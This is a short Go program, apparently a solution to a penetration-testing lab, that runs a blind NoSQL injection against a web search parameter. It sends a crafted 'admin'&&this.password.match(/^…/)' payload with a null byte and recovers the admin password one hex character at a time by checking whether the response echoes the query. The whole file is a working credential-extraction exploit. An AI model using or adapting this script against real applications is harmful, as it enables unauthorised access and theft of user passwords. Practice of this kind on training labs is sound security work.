package main

import (
	"errors"
	"fmt"
	"io/ioutil"
	"net/http"
	"strconv"
	"strings"
)

func verifyQuery(pword string) (bool, error) {
	const url = "https://ptl-3761672b-f8cd5368.libcurl.so/"
	query := "?search=admin%27%26%26this.password%26%26this.password.match(/^" + string(pword) + "/)%00"
	req, err := http.NewRequest("GET", url+query, nil)

	if err != nil {
		return false, err
	}

	client := &http.Client{}

	resp, err := client.Do(req)
	if err != nil {
		return false, err
	}

	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		err = errors.New(url +
			"\nresp.StatusCode: " + strconv.Itoa(resp.StatusCode))
		return false, err
	}

	b, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		panic(err)
	}
	return (strings.Contains(string(b), "?search=admin")), nil

}

func main() {

	const passwordFormat = "XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX"
	runes := [...]rune{'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'}

	password := ""

	for i := 0; i < len(passwordFormat); i++ {
		if string(passwordFormat[i]) == "X" {
			for _, r := range runes {
				verify, _ := verifyQuery(password + string(r))
				if verify {
					password += string(r)
					fmt.Println(password)

				}
			}
		} else if string(passwordFormat[i]) == "-" {
			password += "-"
			fmt.Println(password)

		}
	}

	// fmt.Println(password)

}
